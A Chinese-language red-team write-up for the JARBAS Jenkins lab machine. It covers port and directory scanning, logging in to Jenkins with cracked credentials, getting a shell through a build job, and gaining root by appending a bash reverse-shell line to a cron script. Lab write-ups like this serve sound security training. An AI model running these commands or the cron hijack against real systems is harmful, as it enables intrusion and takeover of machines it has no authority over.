---
title: 红队笔记-JARBAS-Jenkins
date: 2025-10-21
tags:
  - 靶场
categories:
  - 安全相关
description: JARBAS-Jenkins 靶机
---
## 环境

> - kali: 192.168.181.129
> - JARBAS-Jenkins: 192.168.181.0/24 ...

## 信息收集

```bash
nmap -sn 192.168.181.0/24
nmap --min-rate 10000 -p- 192.168.181.139

# 对应端口扫描
nmap -sT -sV -O -p22,80,3306,8080 192.168.181.139
```

![[attachments/20251021.png]]

![[attachments/20251021-1.png]]

```txt
# 分析渗透优先级

以 80,8080 web 为主，22 一般优先级放在后面
80 Apache http 、8080 Jetty 、3306 MariaDB 、22 OpenSSH 4
```

```bash
# 默认脚本扫描
nmap --script=vuln -p80,22,3306,8080 192.168.181.139
```

![[attachments/20251021-2.png]]

## 搜索各端口信息

访问扫描到的 80,8080 端口服务；8080 应该是管理页面入口。

访问扫描出来的 robots.txt ，没有什么信息。

![[attachments/20251021-3.png]]

```bash
# 目录扫描
dirb http://192.168.181.139/	# 没扫出来

gobuster dir -u http://192.168.181.139/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
# 这里所用到的字典需要安装feroxbuster（也是一款目录扫描工具）
# （工具不重要，字典很重要）
```

![[attachments/20251021-4.png]]

访问目标目录

![[attachments/20251021-5.png]]

```bash
# MD5 解密，登录8080端口
tiago:italia99
trindade:marianna
eder:vipsu	# 登录成功
# Jenkins 集成交付、部署框架（可搜索其基本操作及已有漏洞）
```

登录后构建新的任务

![[attachments/20251021-6.png]]

![[attachments/20251021-7.png]]

并写入 shell ，同时 kali 监听端口

![[attachments/20251021-8.png]]

查看用户、系统、权限等信息

```bash
sudo -l		# 列出当前用户所拥有的权限
cat /etc/passwd		# 查看系统有多少账号（分析存在的用户及其是否拥有bash环境）
```

![[attachments/20251021-9.png]]

查看自动任务

```bash
cat /etc/crontab
# cat /etc/cron.d
```

![[attachments/20251021-10.png]]

> root 每隔 5 分钟执行一次 CleaningScript.sh 脚本

查看脚本内容，并将 shell 写入自动任务文件中

```bash
cat /etc/script/CleaningScript.sh

# 追加 shell 脚本到文件中
echo "/bin/bash -i >& /dev/tcp/192.168.181.129/4443 0>&1" >> /etc/script/CleaningScript.sh
```

kali 监听端口，获取 shell，成功提权得到 flag 。

![[attachments/20251021-11.png]]
